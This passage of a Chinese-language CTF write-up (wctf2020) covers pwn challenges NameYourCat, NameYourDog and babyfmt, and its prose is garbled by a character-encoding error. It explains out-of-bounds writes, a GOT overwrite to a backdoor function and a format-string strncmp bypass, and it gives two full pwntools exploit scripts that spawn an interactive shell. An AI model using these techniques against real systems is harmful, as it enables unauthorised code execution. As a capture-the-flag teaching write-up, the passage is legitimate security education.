alt="Gnw6dx.png"></p><p>mainå‡½æ•°çš„æ„æ€å°±æ˜¯5æ¬¡å¾ªç¯ï¼Œç„¶åæ¯æ¬¡éƒ½æ‰§è¡Œä¸€æ¬¡NameWhichï¼Œè¿™ä¸ªå‡½æ•°çš„å‚æ•°æ˜¯v3</p><p>psï¼šå› ä¸ºIDAç»å¸¸æŠŠå‡½æ•°çš„å‚æ•°è¯†åˆ«å‡ºé—®é¢˜ï¼Œæ‰€ä»¥ä¸€å®šè¦ç‚¹è¿›å…·ä½“çš„å‡½æ•°å»çœ‹æˆ–è€…ä»€ä¹ˆçš„</p><p>NameWhichæ˜¯è¿™æ ·çš„</p><p><img src="https://s1.ax1x.com/2020/03/30/GnwUiT.png" alt="GnwUiT.png"></p><p>åœ¨a1ä¸ŠæŒ‰yå°†ç±»å‹æ”¹æˆ<code>char *</code></p><p><img src="https://s1.ax1x.com/2020/03/30/GnwdWF.png" alt="GnwdWF.png"></p><p>æ­¤æ—¶å†æ¥ç¼•ç¨‹åºçš„æ„æ€ï¼Œmainâ€™ä¸­v3æ˜¯ä¸€ä¸ªchar [40]çš„æ•°ç»„ï¼Œç„¶åæ¯æ¬¡æˆ‘ä»¬åœ¨NameWhichä¸­è¾“å…¥çš„ä¸‹æ ‡åå¯»å€éƒ½æ˜¯<code>a1[8*v2]</code>ï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™å¤§è‡´å°±çŸ¥é“äº†åŸæœ¬ç¨‹åºåº”è¯¥æ˜¯å†™äº†ä¸€ä¸ªäºŒç»´æ•°ç»„<code>[5][8]</code></p><p>ä½†æ˜¯ç¨‹åºæ²¡æœ‰å¯¹æˆ‘ä»¬è¾“å…¥çš„ä¸‹æ ‡åšæ£€æŸ¥ï¼Œå­˜åœ¨ä¸€ä¸ªæ•°ç»„è¶Šç•Œå†™ï¼Œæ­¤æ—¶ç”±äºç¨‹åºè‡ªå¸¦åé—¨ï¼Œæ•°ç»„åœ¨æ ˆä¸Šï¼Œæ‰€ä»¥æˆ‘ä»¬æœ‰ä¸€æ¬¡å°†è¿”å›åœ°å€å†™æˆåé—¨åœ°å€å³å¯ï¼Œå…·ä½“ä¸‹æ ‡ç»è¿‡ç®€å•è®¡ç®—å³å¯å¾—åˆ°ï¼š<code>(0x34+4)/8=7</code>ï¼ˆå¯¹è®¡ç®—ä¸‹æ ‡ä¸ç†Ÿæ‚‰çš„ä¸€å®šè¦è‡ªå·±å»ç®—ä¸€ç®—ï¼‰</p><p>psï¼šè¿™é‡Œè¿˜æä¸ªé†’ï¼Œè¿™ç§è¾“å…¥çš„åœ°æ–¹ä¸€å®šè¦æ³¨æ„æœ‰æ²¡æœ‰<code>\x0A</code>ï¼Œå°±æ˜¯æ¢è¡Œç¬¦ï¼Œå¦‚æœè¾“å…¥å­—ç¬¦ä¸²ä¸­ç¢°åˆ°è¿™ä¸ªï¼Œscanfå°±ç›´æ¥æˆªæ–­äº†</p><p><strong>EXP</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>binary = <span class="hljs-string">&#x27;NameYourCat&#x27;</span><span class="hljs-comment">#binary&#x27;s name here</span><br>context.binary = binary<span class="hljs-comment">#context here</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>pty = process.PTY<br><span class="hljs-comment">#p = process(binary, aslr = 1, stdin=pty, stdout=pty)#process option here</span><br><br>Host =<span class="hljs-string">&#x27;0.0.0.0&#x27;</span><br>Port =<span class="hljs-number">2337</span><br>p = remote(Host,Port)<br><br>elf = ELF(binary)<br>libc = elf.libc<br><br>my_u64 = <span class="hljs-keyword">lambda</span> x: u64(x.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>my_u32 = <span class="hljs-keyword">lambda</span> x: u32(x.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>global_max_fast=<span class="hljs-number">0x3c67f8</span><br>codebase = <span class="hljs-number">0x555555554000</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">loginfo</span>(<span class="hljs-params">what=<span class="hljs-string">&#x27;&#x27;</span>,address=<span class="hljs-number">0</span></span>):<br>log.info(<span class="hljs-string">&quot;\033[1;36m&quot;</span> + what + <span class="hljs-string">&#x27;-----&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(address) + <span class="hljs-string">&quot;\033[0m&quot;</span>)<br><br><span class="hljs-comment"># todo here</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">namefor</span>(<span class="hljs-params">idx,name</span>):<br>p.recvuntil(<span class="hljs-string">&quot;which?\n&gt;&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&#x27;name plz: &#x27;</span>)<br>p.sendline(name)<br><br>namefor(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;A&#x27;</span>)<br>namefor(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;B&#x27;</span>)<br>namefor(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;C&#x27;</span>)<br>namefor(<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;D&#x27;</span>)<br>namefor(<span class="hljs-number">7</span>,p32(<span class="hljs-number">0x080485CB</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="NameYourDog-5-solves"><a href="#NameYourDog-5-solves" class="headerlink" title="NameYourDog - 5 solves"></a>NameYourDog - 5 solves</h2><blockquote><p>Author: ColdShield</p></blockquote><p>flag:<code>wctf2020&#123;Woof_wOOf_wooF&#125;</code></p><p><strong>ç¨‹åºåˆ†æ</strong></p><p><img src="https://s1.ax1x.com/2020/03/30/GnwBQJ.png" alt="GnwBQJ.png"></p><p>ç¨‹åºåŸºæœ¬ä¸Šå’ŒNameYourCatä¸€æ¨¡ä¸€æ ·</p><p>å”¯ä¸€ä¸åŒä¹‹å¤„åœ¨äº<code>Dogs</code>æ­¤æ—¶ä¸åœ¨æ ˆä¸Šäº†ï¼Œè€Œæ˜¯åœ¨bssæ®µä¸Š</p><p>æ­¤æ—¶çš„æ•°ç»„è¶Šç•Œå°±å˜æˆäº†ä¸‹æ ‡ä¸ºè´Ÿæ•°æ—¶åˆ©ç”¨ï¼Œä»è€Œå¯ä»¥ä»»æ„ä¿®æ”¹ç¨‹åºåœ°å€ç©ºé—´çš„å†…å®¹ï¼Œç”±äºç¨‹åºæ²¡æœ‰å¼€å¯<code>FULL Relo</code>æˆ‘è¿™é‡Œæœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯ä¿®æ”¹GOTè¡¨ï¼ˆä¸çŸ¥é“GOTè¡¨æ˜¯å•¥çš„å°ä¼™ä¼´ä¹Ÿè¯·è‡ªè¡Œç™¾åº¦å­¦ä¹ 233333ï¼‰</p><p>æˆ‘é‡‡ç”¨çš„æ–¹æ³•æ˜¯å°†<code>scanf</code>çš„GOTè¡¨é¡¹ä¿®æ”¹ä¸ºåé—¨å‡½æ•°åœ°å€ï¼Œä»è€Œåœ¨åç»­æ‰§è¡Œåˆ°scanfçš„æ—¶å€™å°±ç›´æ¥getshelläº†</p><p>æ­¤æ—¶çš„ä¸‹æ ‡è®¡ç®—ï¼š<code>(0x0804A028-0804A060)/8=-7</code></p><p><strong>EXP</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>binary = <span class="hljs-string">&#x27;NameYourDog&#x27;</span><span class="hljs-comment">#binary&#x27;s name here</span><br>context.binary = binary<span class="hljs-comment">#context here</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>pty = process.PTY<br><span class="hljs-comment">#p = process(binary, aslr = 1, stdin=pty, stdout=pty)#process option here</span><br><br>Host =<span class="hljs-string">&#x27;0.0.0.0&#x27;</span><br>Port =<span class="hljs-number">2338</span><br>p = remote(Host,Port)<br><br>elf = ELF(binary)<br>libc = elf.libc<br><br>my_u64 = <span class="hljs-keyword">lambda</span> x: u64(x.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>my_u32 = <span class="hljs-keyword">lambda</span> x: u32(x.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>global_max_fast=<span class="hljs-number">0x3c67f8</span><br>codebase = <span class="hljs-number">0x555555554000</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">loginfo</span>(<span class="hljs-params">what=<span class="hljs-string">&#x27;&#x27;</span>,address=<span class="hljs-number">0</span></span>):<br>log.info(<span class="hljs-string">&quot;\033[1;36m&quot;</span> + what + <span class="hljs-string">&#x27;-----&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(address) + <span class="hljs-string">&quot;\033[0m&quot;</span>)<br><br><span class="hljs-comment"># todo here</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">namefor</span>(<span class="hljs-params">idx,name</span>):<br>p.recvuntil(<span class="hljs-string">&quot;which?\n&gt;&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&#x27;name plz: &#x27;</span>)<br>p.sendline(name)<br><br>namefor(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;A&#x27;</span>)<br>namefor(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;B&#x27;</span>)<br>namefor(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;C&#x27;</span>)<br>namefor(-<span class="hljs-number">7</span>,p32(<span class="hljs-number">0x080485CB</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="babyfmt-2-solves"><a href="#babyfmt-2-solves" class="headerlink" title="babyfmt - 2 solves"></a>babyfmt - 2 solves</h2><blockquote><p>Author: ru7n</p></blockquote><p>æœ¬é¢˜å°±æ˜¯æŠŠä¸€äº›ç‚¹ç³…åˆå†äº†ä¸€èµ·ï¼Œæ²¡å•¥æ–°æ„ï¼Œ:P</p><p>ç¨‹åºä¸€å¼€å§‹æ˜¯ä¸ªè¯¢é—®æ—¶é—´çš„å‡½æ•°<strong>ask_time</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">ask_time</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 v1; <span class="hljs-comment">// [rsp+0h] [rbp-20h]</span><br>  __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-18h]</span><br>  __int64 v3; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;dididada.....&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;tell me the time:&quot;</span>);<br>  _isoc99_scanf(<span class="hljs-string">&quot;%ld&quot;</span>, &amp;v1);<br>  _isoc99_scanf(<span class="hljs-string">&quot;%ld&quot;</span>, &amp;v2);<br>  _isoc99_scanf(<span class="hljs-string">&quot;%ld&quot;</span>, &amp;v3);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ok! time is %ld:%ld:%ld\n&quot;</span>, v1, v2, v3);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¦æ±‚æˆ‘ä»¬è¾“å…¥æ•°å­—ï¼Œç„¶ååœ¨æ‰“å°å‡ºæ¥</p><p>è¿™é‡Œçš„ä¸€ä¸ªçŸ¥è¯†ç‚¹æ˜¯ï¼Œå¦‚æœè¾“å…¥å’Œ<code>scanf</code>å‡½æ•°éœ€æ±‚çš„æ ¼å¼ä¸ä¸€è‡´ï¼Œé‚£ä¹ˆæ˜¯ä¸ä¼šæ”¹å˜å˜é‡çš„å€¼çš„ï¼Œæ„æ€å°±æ˜¯<strong>scanf</strong>æœ¬æ¥è¦æ±‚æˆ‘ä»¬è¦è¾“å…¥æ•°å­—(%ld)ï¼Œä½†æˆ‘ä»¬è¾“å…¥â€™aâ€™å•Šï¼Œâ€™bâ€™å•Šä»€ä¹ˆçš„ï¼Œåæ­£ä¸æ˜¯æ•°å­—å°±è¡Œï¼Œè¿™æ ·<code>v1,v2,v3</code>çš„å€¼å°±ä¸ä¼šæ”¹å˜ï¼Œåˆ°äº†<code>printf(&quot;ok! time is %ld:%ld:%ld\n&quot;, v1, v2, v3);</code>è¿™å¥çš„æ—¶å€™å°±ä¼šæŠŠæ ˆé‡Œçš„å†…å®¹æ‰“å°å‡ºæ¥ï¼Œæ³„éœ²å‡ºåœ°å€ï¼Œæœ¬é¢˜æ˜¯æ³„éœ²äº†ç¨‹åºçš„åŸºåœ°å€</p><p>ç„¶åå°±åˆ°äº†èœå•é¢˜ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. leak&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. fmt_attack&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3. get_flag&quot;</span>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4. exit&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>);<br></code></pre></td></tr></table></figure><p><strong>leak</strong>å‡½æ•°ç»™äº†ä¸€æ¬¡ä»»æ„è¯»ä¸€å­—èŠ‚çš„æœºä¼šï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">leak</span><span class="hljs-params">(_DWORD *a1)</span><br>&#123;<br>  <span class="hljs-type">void</span> *buf; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( *a1 &gt; <span class="hljs-number">0</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No way!&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  *a1 = <span class="hljs-number">1</span>;<br>  read_n(&amp;buf, <span class="hljs-number">8LL</span>);<br>  write(<span class="hljs-number">1</span>, buf, <span class="hljs-number">1uLL</span>);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>fmt_attack</strong>å‡½æ•°ç»™äº†ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ”»å‡»çš„æœºä¼šï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">fmt_attack</span><span class="hljs-params">(_DWORD *a1)</span><br>&#123;<br>  <span class="hljs-type">char</span> format; <span class="hljs-comment">// [rsp+10h] [rbp-40h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+48h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">memset</span>(&amp;format, <span class="hljs-number">0</span>, <span class="hljs-number">0x30</span>uLL);<br>  <span class="hljs-keyword">if</span> ( *a1 &gt; <span class="hljs-number">0</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No way!&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  *a1 = <span class="hljs-number">1</span>;<br>  read_n(&amp;format, <span class="hljs-number">0x28</span>LL);<br>  <span class="hljs-built_in">printf</span>(&amp;format, <span class="hljs-number">0x28</span>LL);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€åæ˜¯<strong>get_flag</strong>å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __noreturn <span class="hljs-title function_">get_flag</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> fd; <span class="hljs-comment">// ST0C_4</span><br>  <span class="hljs-type">char</span> s2; <span class="hljs-comment">// [rsp+10h] [rbp-60h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+68h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">memset</span>(&amp;s2, <span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>uLL);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;If you can open the door!&quot;</span>);<br>  read_n(&amp;s2, <span class="hljs-number">64LL</span>);<br>  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strncmp</span>(secret, &amp;s2, <span class="hljs-number">0x40</span>uLL) )<br>  &#123;<br>    close(<span class="hljs-number">1</span>);<br>    fd = open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">0</span>);<br>    read(fd, &amp;s2, <span class="hljs-number">0x50</span>uLL);<br>    <span class="hljs-built_in">printf</span>(&amp;s2, &amp;s2);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No way!&quot;</span>);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾ï¼Œå¦‚æœæˆ‘ä»¬è¦æ‹¿åˆ°<strong>flag</strong>ï¼Œå°±å¿…é¡»ç»•è¿‡<code>strncmp(secret, &amp;s2, 0x40uLL)</code>ï¼Œç»•è¿‡äº†è¿™ä¸ªä¹‹åï¼Œç”±äº<code>close(1)</code>æŠŠè¾“å‡ºæµå…³äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜å¾—æƒ³åŠæ³•è®©<code>flag</code>èƒ½æ‰“å°å‡ºæ¥</p><p>é¦–å…ˆæ˜¯ç»•è¿‡<code>strncmp</code>ï¼Œè¿™ä¸ªç®€å•ï¼Œåªè¦æŠŠ<code>secret</code>çš„é¦–å­—èŠ‚å˜ä¸º<code>\x00</code>å°±å¥½ï¼Œè¿™æ ·æˆ‘ä»¬åªè¦è¾“å…¥<code>\x00</code>å°±èƒ½ç»•è¿‡è¿™ä¸ªæ£€æŸ¥ï¼ŒåŸç†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// strncmpæºç </span><br><span class="hljs-type">int</span><br><span class="hljs-title function_">STRNCMP</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *s1, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *s2, <span class="hljs-type">size_t</span> n)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> c1 = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> c2 = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><br>  <span class="hljs-keyword">if</span> (n &gt;= <span class="hljs-number">4</span>)<br>    &#123;<br>      <span class="hljs-type">size_t</span> n4 = n &gt;&gt; <span class="hljs-number">2</span>;<br>      <span class="hljs-keyword">do</span><br>&#123;<br>  c1 = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>) *s1++;<br>  c2 = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>) *s2++;<br>  <span class="hljs-keyword">if</span> (c1 == <span class="hljs-string">&#x27;\0&#x27;</span> || c1 != c2)<br>    <span class="hljs-keyword">return</span> c1 - c2;<br>         ...........................................<br></code></pre></td></tr></table></figure><p>ç»•è¿‡äº†è¿™ä¸ª<code>strncmp</code>åï¼Œå°±è¦çœ‹çœ‹æ€ä¹ˆæŠŠ<code>flag</code>æ‰“å°å‡ºæ¥äº†</p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨ç¨‹åºçš„<code>.bss</code>æ®µé‡Œå­˜æ”¾åœ¨<code>stdin,stdout,stderr</code>çš„æŒ‡é’ˆï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">.bss:<span class="hljs-number">0000000000202020</span> _bss            segment para public <span class="hljs-string">&#x27;BSS&#x27;</span> use64<br>.bss:<span class="hljs-number">0000000000202020</span>                 assume cs:_bss<br>.bss:<span class="hljs-number">0000000000202020</span>                 ;org <span class="hljs-number">202020</span>h<br>.bss:<span class="hljs-number">0000000000202020</span>                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing<br>.bss:<span class="hljs-number">0000000000202020</span>                 public <span class="hljs-built_in">stdout</span>@@GLIBC_2_2_5<br>.bss:<span class="hljs-number">0000000000202020</span> ; FILE *<span class="hljs-built_in">stdout</span><br>.bss:<span class="hljs-number">0000000000202020</span> <span class="hljs-built_in">stdout</span>@@GLIBC_2_2_5 dq ?                ; DATA XREF: LOAD:<span class="hljs-number">00000000000004B</span>8â†‘o<br>.bss:<span class="hljs-number">0000000000202020</span>                                         ; initial+<span class="hljs-number">35</span>â†‘r<br>.bss:<span class="hljs-number">0000000000202020</span>                                         ; Alternative name is <span class="hljs-string">&#x27;stdout&#x27;</span><br>.bss:<span class="hljs-number">0000000000202020</span>                                         ; Copy of shared data<br>.bss:<span class="hljs-number">0000000000202028</span>                 align <span class="hljs-number">10</span>h<br>.bss:<span class="hljs-number">0000000000202030</span>                 public <span class="hljs-built_in">stdin</span>@@GLIBC_2_2_5<br>.bss:<span class="hljs-number">0000000000202030</span> ; FILE *<span class="hljs-built_in">stdin</span><br>.bss:<span class="hljs-number">0000000000202030</span> <span class="hljs-built_in">stdin</span>@@GLIBC_2_2_5 dq ?                 ; DATA XREF: LOAD:<span class="hljs-number">0000000000000500</span>â†‘o<br>.bss:<span class="hljs-number">0000000000202030</span>                                         ; initial+<span class="hljs-number">17</span>â†‘r<br>.bss:<span class="hljs-number">0000000000202030</span>                                         ; Alternative name is <span class="hljs-string">&#x27;stdin&#x27;</span><br>.bss:<span class="hljs-number">0000000000202030</span>                                         ; Copy of shared data<br>.bss:<span class="hljs-number">0000000000202038</span>                 align <span class="hljs-number">20</span>h<br>.bss:<span class="hljs-number">0000000000202040</span>                 public <span class="hljs-built_in">stderr</span>@@GLIBC_2_2_5<br>.bss:<span class="hljs-number">0000000000202040</span> ; FILE *<span class="hljs-built_in">stderr</span><br>.bss:<span class="hljs-number">0000000000202040</span> <span class="hljs-built_in">stderr</span>@@GLIBC_2_2_5 dq ?                ; DATA XREF: LOAD:<span class="hljs-number">0000000000000530</span><br></code></pre></td></tr></table></figure><p>åŠ¨æ€è°ƒè¯•çš„æ—¶å€™è·Ÿè¿›<code>printf</code>å‡½æ•°ï¼Œä¼šå‘ç°<code>printf</code>ä¼šå–è¿™é‡Œçš„æŒ‡é’ˆï¼š</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"> â–º <span class="hljs-number">0x7f8f4b0c488a</span> &lt;printf+<span class="hljs-number">138</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rip</span> + <span class="hljs-number">0x36e6bf</span>]<br>   <span class="hljs-number">0x7f8f4b0c4891</span> &lt;printf+<span class="hljs-number">145</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span>]<br>   <span class="hljs-number">0x7f8f4b0c4894</span> &lt;printf+<span class="hljs-number">148</span>&gt;    <span class="hljs-keyword">call</span>   vfprintf &lt;<span class="hljs-number">0x7f8f4b0bc170</span>&gt;<br> <br>   <span class="hljs-number">0x7f8f4b0c4899</span> &lt;printf+<span class="hljs-number">153</span>&gt;    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">rsp</span>, <span 